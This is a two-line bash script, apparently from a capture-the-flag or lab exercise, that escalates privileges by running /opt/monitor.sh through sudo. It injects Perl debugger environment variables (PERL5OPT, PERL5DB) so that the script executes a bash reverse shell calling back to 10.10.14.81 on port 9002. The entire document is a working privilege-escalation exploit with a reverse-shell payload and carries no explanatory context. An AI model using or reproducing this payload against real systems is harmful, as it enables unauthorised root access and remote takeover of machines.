#!/bin/bash
sudo 'PERL5OPT=-d' 'PERL5DB=print(`bash -c "bash -i >& /dev/tcp/10.10.14.81/9002 0>&1"`);exit;' /opt/monitor.sh